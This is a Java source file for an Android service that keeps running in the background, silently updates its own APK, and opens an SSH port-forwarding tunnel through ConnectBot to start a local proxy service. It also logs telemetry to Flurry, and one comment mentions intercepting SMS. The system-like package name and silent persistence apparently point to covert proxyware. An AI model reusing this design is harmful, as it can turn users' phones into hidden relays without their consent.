package com.android.sms.proxy.service;

import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.IBinder;
import android.os.RemoteException;
import android.support.annotation.Nullable;
import android.support.v4.app.ServiceCompat;
import android.text.TextUtils;
import android.util.Log;

import com.android.sms.proxy.entity.BindServiceEvent;
import com.android.sms.proxy.entity.MessageEvent;
import com.android.sms.proxy.entity.NativeParams;
import com.flurry.android.FlurryAgent;
import com.oplay.nohelper.assist.bolts.Task;
import com.oplay.nohelper.utils.Util_Service;

import org.connectbot.bean.HostBean;
import org.connectbot.bean.PortForwardBean;
import org.connectbot.event.WaitForSocketEvent;
import org.connectbot.service.BridgeDisconnectedListener;
import org.connectbot.service.TerminalBridge;
import org.connectbot.service.TerminalManager;
import org.greenrobot.eventbus.EventBus;
import org.greenrobot.eventbus.Subscribe;

import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.Callable;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ScheduledFuture;
import java.util.concurrent.TimeUnit;


/**
 * @author zyq 16-3-9
 */
public class HeartBeatService extends Service implements BridgeDisconnectedListener {

	private static final boolean DEBUG = true;
	private static final String TAG = "heartBeatService";
	private ScheduledExecutorService mExecutorService;
	private ScheduledExecutorService mCheckExecutorService;
	private ScheduledFuture mScheduledFuture;
	private static final long MESSAGE_INIT_DELAY = 60 ;//Message 推送延迟
	public static long MESSAGE_DELAY = 20;//Message 轮询消息
	private HeartBeatRunnable mHeartBeatRunnable = null;
	private CheckServiceRunnable mCheckServiceRunnable = null;
	private TerminalManager binder;
	private TerminalBridge hostBridge;
	private IProxyControl mProxyControl;
	private boolean isProxyServiceRunning;
	//记录当前建立号的连接，方便在拦截短信
	public static long recordConnectTime = 0;
	private static HeartBeatService instance;

	public static HeartBeatService getInstance() {
		return instance;
	}

	@Override
	public void onCreate() {
		super.onCreate();
		if (DEBUG) {
			Log.d(TAG, "service onCreate()");
		}
		EventBus.getDefault().register(this);
		FlurryAgent.onStartSession(this);
		instance = this;
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		//更新应用先,不要放到activity中,
		Task.callInBackground(new Callable<Object>() {
			@Override
			public Object call() throws Exception {
				ApkUpdateUtil.getInstance(getApplication()).updateApk();
				return null;
			}
		});
		scheduledWithFixedDelay(MESSAGE_DELAY);
		return ServiceCompat.START_STICKY;
	}


	public void scheduledWithFixedDelay(long duration) {
		try {
			if (mScheduledFuture == null || mScheduledFuture.isCancelled()) {
				if (DEBUG) {
					Log.d(TAG, "开始发心跳包");
				}
				//EventBus.getDefault().postSticky(new MessageEvent("开始发心跳包"));
			}
			if (mExecutorService == null) {
				mExecutorService = Executors.newScheduledThreadPool(2);
			}
			if (mHeartBeatRunnable == null) {
				mHeartBeatRunnable = new HeartBeatRunnable(this, this);
			}
			if (mScheduledFuture == null || mScheduledFuture.isCancelled()) {
				if (DEBUG) {
					Log.d(TAG, "重新启动scheduledFuture");

				}
				mExecutorService.schedule(new GetMsgRunnable(this),10,TimeUnit.SECONDS);
				mScheduledFuture = mExecutorService.scheduleWithFixedDelay(mHeartBeatRunnable, MESSAGE_INIT_DELAY,
						duration,
						TimeUnit.SECONDS);
			}
		} catch (Throwable e) {
			FlurryAgent.onError(TAG, "", e);
		}
	}

	@Override
	public void onDestroy() {
		super.onDestroy();
		FlurryAgent.onEndSession(this);
		try {
			if (DEBUG) {
				Log.d(TAG, "heartBeatService destroy()");
			}
			if (mHeartBeatRunnable != null) {
				mHeartBeatRunnable.isSSHConnected = false;
			}
			if (mProxyControl != null) {
				unbindService(proxyConnection);
			}
			if (binder != null) {
				unbindService(mTerminalConnection);
				if (DEBUG) {
					Log.d(TAG, "heartBeatService结束自己，terminalManager也要结束自己");
				}
				binder.stopSelf();
			}
			if (mScheduledFuture != null) {
				cancelScheduledTasks();
			}
		} catch (Throwable e) {
			if (DEBUG) {
				Log.e(TAG, e.fillInStackTrace().toString());
			}
			FlurryAgent.onError(TAG, "", e);
		}
	}

	@Nullable
	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}


	public void cancelScheduledTasks() {
		if (mScheduledFuture != null) {
			if (DEBUG) Log.d(TAG, "中断该任务");
			if (!mScheduledFuture.isCancelled()) {
				mScheduledFuture.cancel(true);
			}
		}
		mScheduledFuture = null;
		mExecutorService.shutdownNow();
		mExecutorService = null;
	}


	public void startTerminalService() {
		try {
			Intent serviceIntent = new Intent(this, TerminalManager.class);
			bindService(serviceIntent, mTerminalConnection, Context.BIND_AUTO_CREATE);
		} catch (Throwable e) {
			if (DEBUG) {
				Log.e(TAG, e.fillInStackTrace().toString());
			}
			FlurryAgent.onError(TAG, "", e);
		}
	}

	/**
	 * 确保service一定要在运行状态
	 * 有时候可能在设置界面该service被干掉，然后没收到任何回调，这时候TerminalManager,ProxyService都是挂着的状态．
	 */
	private void sureServiceIsRunning(String serviceName) {
		try {
			if (mCheckExecutorService == null) {
				mCheckExecutorService = Executors.newScheduledThreadPool(1);
			}
			mCheckServiceRunnable = new CheckServiceRunnable(serviceName);
			mCheckExecutorService.scheduleWithFixedDelay(mCheckServiceRunnable, MESSAGE_INIT_DELAY, 30, TimeUnit
					.SECONDS);
		} catch (Throwable e) {
			if (DEBUG) {
				Log.e(TAG, e.fillInStackTrace().toString());
			}
			FlurryAgent.onError(TAG, "", e);
		}
	}

	class CheckServiceRunnable implements Runnable {

		private String serviceName;

		public CheckServiceRunnable(String svcName) {
			serviceName = svcName;
		}

		@Override
		public void run() {
			try {
				boolean isTerminalServiceLive = Util_Service.isServiceRunning(HeartBeatService.this, TerminalManager
						.class.getCanonicalName());
				boolean isProxyServiceLive = Util_Service.isServiceRunning(HeartBeatService.this, ProxyService.class
						.getCanonicalName());
				if (DEBUG) {
					Log.d(TAG, "要检测的名字是:" + serviceName + " 当前终端服务：" + isTerminalServiceLive + "  当前代理服务：" +
							isProxyServiceLive);
				}
				switch (serviceName) {
					case "org.connectbot.service.TerminalManager":
						if (!isTerminalServiceLive) {
							if (isProxyServiceRunning) {
								//destroyProxyService();
							}
						} else {
							HostBean hostBean = ProxyServiceUtil.getInstance(HeartBeatService.this).getHostBean();
							if (hostBean != null && !TextUtils.isEmpty(hostBean.getUsername()) && binder != null) {
								TerminalBridge bridge = binder.getConnectedBridge(hostBean);
								if (bridge == null) {
									HeartBeatRunnable.isSSHConnected = false;
								}
							} else {
								HeartBeatRunnable.isSSHConnected = false;
							}
						}
						break;
				}
			} catch (Throwable e) {
				if (DEBUG) {
					Log.e(TAG, e.fillInStackTrace().toString());
				}
				FlurryAgent.onError(TAG, "", e);
			}
		}
	}

	private ServiceConnection mTerminalConnection = new ServiceConnection() {

		@Override
		public void onServiceConnected(ComponentName name, IBinder service) {
			if (DEBUG) {
				Log.d(TAG, "TerminalManager service 建立起来了");
			}
			binder = ((TerminalManager.TerminalBinder) service).getService();
			binder.disconnectListener = HeartBeatService.this;
			final HostBean mHostBean = ProxyServiceUtil.getInstance(HeartBeatService.this).getHostBean();
			final PortForwardBean portForward = ProxyServiceUtil.getInstance(HeartBeatService.this)
					.getPortFowardBean();
			if (DEBUG) {
				Log.d(TAG, "TerminalManager建立起来的hostBean:" + mHostBean + " portForwardBean:" + portForward);
			}
			if (mHostBean != null && portForward != null) {

				Uri requested = mHostBean.getUri();
				final String requestedNickName = (requested != null) ? requested.getFragment() : null;

				if (DEBUG) {
					Log.d(TAG, "requestedNickName:" + requested.getFragment());
				}
				hostBridge = binder.getConnectedBridge(requestedNickName);
				if (requestedNickName != null && hostBridge == null && portForward != null) {
					try {
						if (DEBUG) {
							Log.d(TAG, String.format("We couldnt find an existing bridge with URI=%s (nickname=%s), " +
									"so" +
									" " +
									"creating one now", requested.toString(), requestedNickName));
						}
						hostBridge = binder.openConnection(requested, portForward);
					} catch (Throwable e) {
						if (DEBUG) {
							Log.e(TAG, "Problem while trying to create new requested bridge from URI", e);
						}
						FlurryAgent.onError(TAG, "", e);
					}
				}

			}
		}

		@Override
		public void onServiceDisconnected(ComponentName name) {
			binder = null;
		}
	};

	@Subscribe
	public void onEvent(BindServiceEvent event) {
		try {
			if (event != null) {
				if (binder == null) {
					recordConnectTime = System.currentTimeMillis();
					startTerminalService();
					final String message = "start terminal service!!!";
					EventBus.getDefault().post(new MessageEvent(message));
//					sureServiceIsRunning(TerminalManager.class.getCanonicalName());
				}
			}
		} catch (Throwable e) {
			FlurryAgent.onError(TAG, "", e);
		}
	}

	@Subscribe
	public void onEvent(WaitForSocketEvent event) {
		try {
			if (event != null) {
				//统计建立成功的时间
				if (DEBUG) Log.d(TAG, "收到等待建立socket的事件！！！！！！！！！！");
				final long currentTime = System.currentTimeMillis();
				final long buildTime = currentTime - recordConnectTime;
				Map<String, String> map = new HashMap<>();
				map.put(NativeParams.KEY_SSH_CONNECT_TIME, String.valueOf(buildTime));
				FlurryAgent.logEvent(NativeParams.EVENT_SSH_CONNECT_SUCCESS, map);
				//关闭代理服务先！！！！！！！！！！

				destroyProxyService();
				initProxyService();
//				HttpProxyServer server = DefaultHttpProxyServer.bootstrap()
//						.withPort(8964)
//                        .withFiltersSource(new HttpFiltersSourceAdapter() {
//                            @Override
//                            public HttpFilters filterRequest(HttpRequest originalRequest, ChannelHandlerContext ctx) {
//                                return new HttpFiltersAdapter(originalRequest) {
//                                    @Override
//                                    public HttpResponse clientToProxyRequest(HttpObject httpObject) {
//                                        return super.clientToProxyRequest(httpObject);
//                                    }
//
//                                    @Override
//                                    public HttpObject proxyToClientResponse(HttpObject httpObject) {
//                                        return super.proxyToClientResponse(httpObject);
//                                    }
//                                };
//                            }
//                        })
//                        .withFiltersSource(new HttpFiltersSource() {
//                            @Override
//                            public HttpFilters filterRequest(HttpRequest originalRequest, ChannelHandlerContext ctx) {
//                                return null;
//                            }
//
//                            @Override
//                            public int getMaximumRequestBufferSizeInBytes() {
//                                return 10 *1024*1024;
//                            }
//
//                            @Override
//                            public int getMaximumResponseBufferSizeInBytes() {
//                                return 10*1024*1024;
//                            }
//                        })
//						.start();
				//HeartBeatRunnable.isSSHConnected = true;
//				HttpProxyServer server =
//						DefaultHttpProxyServer.bootstrap()
//								.withPort(8964) // for both HTTP and HTTPS
//								.start();
			}
		} catch (Throwable e) {
			FlurryAgent.onError(TAG, "", e);
		}
	}

	private void initProxyService() {
		new Thread(new Runnable() {
			@Override
			public void run() {
				try {
					Thread.sleep(500);
					if (DEBUG) {
						Log.d(TAG, "休息了500秒后真正开启代理服务！！！！！！！");
					}
					final boolean isProxyServiceRunning = Util_Service.isServiceRunning(HeartBeatService.this,
							ProxyService.class
									.getCanonicalName());
					final boolean isTerminalServiceRunning = Util_Service.isServiceRunning(HeartBeatService.this,
							TerminalManager.class
									.getCanonicalName());
					if (DEBUG) {
						Log.d(TAG, "当前proxyService状态：" + isProxyServiceRunning + " 终端service的状态");
					}
					if (!isTerminalServiceRunning) {
						if (isProxyServiceRunning) {
							try {
								if (DEBUG) {
									Log.d(TAG, "状态不对等，干掉代理服务！！！！！");
								}
								destroyProxyService();
							} catch (RemoteException e) {
								if (DEBUG) {
									Log.e(TAG, e.fillInStackTrace().toString());
								}
							}
						}
					} else {
						if (!isProxyServiceRunning) {
							startProxyService();
						} else {
							if (DEBUG) {
								Log.d(TAG, "服务已经存在,不需重启了");
							}
							try {
								destroyProxyService();
								if(DEBUG){
									Log.d(TAG,"服务已存在，先kill该服务，再重启服务！！！！！");
								}
								Thread.sleep(2000);
								startProxyService();
							} catch (Throwable e) {
								if (DEBUG) {
									Log.e(TAG, e.fillInStackTrace().toString());
								}
							}
						}
					}
				} catch (InterruptedException e) {
					if (DEBUG) {
						Log.d(TAG, e.toString());
					}
				}
			}
		}).start();

	}

	private void startProxyService() {
		boolean isProxySuccess = false;
		try {
			if (DEBUG) {
				Log.d(TAG, "开始绑定代理服务！！！！！！！！！！");
			}
			Intent serviceIntent = new Intent(this, ProxyService.class);
			bindService(serviceIntent, proxyConnection, Context.BIND_AUTO_CREATE);
			isProxySuccess = true;
			HeartBeatRunnable.isSSHConnected = true;
		} catch (Throwable e) {
			if (DEBUG) {
				Log.e(TAG, e.fillInStackTrace().toString());
			}
			FlurryAgent.onError(TAG, "", e);
			isProxySuccess = false;
			HeartBeatRunnable.isSSHConnected = false;
		}

		if (isProxySuccess) {
			EventBus.getDefault().post(new MessageEvent("proxy service start success!!!"));
		}
		Map<String, String> map = new HashMap<>();
		map.put(NativeParams.KEY_PROXY_CONNECT_SUCCESS, String.valueOf(isProxySuccess));
		FlurryAgent.logEvent(NativeParams.EVENT_START_PROXY, map);
	}

	public void destroyProxyService() throws RemoteException {
		boolean isRunning = Util_Service.isServiceRunning(this, ProxyService.class.getCanonicalName());
		if (DEBUG) Log.d(TAG, "当前代理服务的状态：" + isRunning);

		if (mHeartBeatRunnable != null) {
			mHeartBeatRunnable.isSSHConnected = false;
		}
		if (!isRunning) return;
		if (mProxyControl != null) {
			Log.d(TAG, "关闭代理服务！！！2 " + Util_Service.isServiceRunning(this, ProxyService.class.getCanonicalName()));
			mProxyControl.stop();
			Log.d(TAG, "关闭代理服务！！！3 " + Util_Service.isServiceRunning(this, ProxyService.class.getCanonicalName()));
			unbindService(proxyConnection);
			Log.d(TAG, "关闭代理服务！！！4 " + Util_Service.isServiceRunning(this, ProxyService.class.getCanonicalName()));
			((ProxyService) mProxyControl).stopSelf();
			mProxyControl = null;
		}
	}

	public void destroyTerminalService() {
		boolean isRunning = Util_Service.isServiceRunning(this, TerminalManager.class.getCanonicalName());
		if (mHeartBeatRunnable != null) {
			mHeartBeatRunnable.isSSHConnected = false;
		}
		if (!isRunning) return;
		if (binder != null) {
//			Log.d(TAG, "关闭终端服务！！！2 " + Util_Service.isServiceRunning(this, TerminalManager.class.getCanonicalName()));
			unbindService(mTerminalConnection);
//			Log.d(TAG, "关闭终端服务！！！3 " + Util_Service.isServiceRunning(this, TerminalManager.class
//					.getCanonicalName()));
			binder.stopSelf();
//			Log.d(TAG, "关闭终端服务！！！4 " + Util_Service.isServiceRunning(this, TerminalManager.class
//					.getCanonicalName()));
			binder = null;
		}
	}


	private ServiceConnection proxyConnection = new ServiceConnection() {
		@Override
		public void onServiceConnected(ComponentName name, IBinder service) {
			mProxyControl = (IProxyControl) service;
//			Log.d(TAG, "proxyService开始监听" + ProxyServiceUtil.getDestPort() + "端口");
//			Log.d(TAG, "proxyService 开始链接" + mProxyControl);
			try {
				if (!isProxyServiceRunning && mProxyControl != null) {
					isProxyServiceRunning = mProxyControl.start();
				}
			} catch (RemoteException e) {
				if (DEBUG) {
					Log.e(TAG, e.fillInStackTrace().toString());
				}
				FlurryAgent.onError(TAG, "", e.fillInStackTrace());
			}
		}

		@Override
		public void onServiceDisconnected(ComponentName name) {
			mProxyControl = null;
		}
	};


	//连接成功，失败都会调用该方法．
	//1.当网络断开时候，连接断开会调用该方法
	//２.连接不上host时候会出现该问题
	//３.在读远程数据时候出现问题，这应该算丢包问题．
	@Override
	public void onDisconnected(TerminalBridge bridge) {
		try {
			if (DEBUG) {
				Log.d(TAG, "终端连接失败，进入失败流程！！！！！！");
			}
			//进来这里，说明有可能连接成功，有可能连接失败,怎么判断是否连接成功呢
			final boolean isProxyServiceLive = Util_Service.isServiceRunning(this, ProxyService.class.getCanonicalName
					());
			final boolean isNetworkConnected = isNetWorkConnected();
			//统计成功的几率
			Map<String, String> map = new HashMap<>();
			map.put(NativeParams.KEY_SSH_CONNECT_SUCCESS, String.valueOf(isProxyServiceLive && isNetworkConnected));
			FlurryAgent.logEvent(NativeParams.EVENT_START_SSH_CONNECT, map);


			HeartBeatRunnable.isSSHConnected = false;
			HeartBeatRunnable.mCurrentCount = 0;
			HeartBeatRunnable.isStartSSHBuild = false;
			destroyTerminalService();
			destroyProxyService();
		} catch (RemoteException e) {
			if (DEBUG) {
				Log.e(TAG, "heartBeatService.onDisconnected()函数异常:" + e.fillInStackTrace().toString());
			}
			FlurryAgent.onError(TAG, "", e);
		}
	}

	public boolean isNetWorkConnected() {
		boolean mIsConnected = false;
		final ConnectivityManager cm =
				(ConnectivityManager) this.getSystemService(Context.CONNECTIVITY_SERVICE);

		final WifiManager wm = (WifiManager) this.getSystemService(Context.WIFI_SERVICE);

		final NetworkInfo info = cm.getActiveNetworkInfo();
		if (info != null) {
			mIsConnected = (info.getState() == NetworkInfo.State.CONNECTED);
		}
		return mIsConnected;
	}

	public TerminalManager getBinder() {
		return binder;
	}

	public IProxyControl getmProxyControl() {
		return mProxyControl;
	}


}
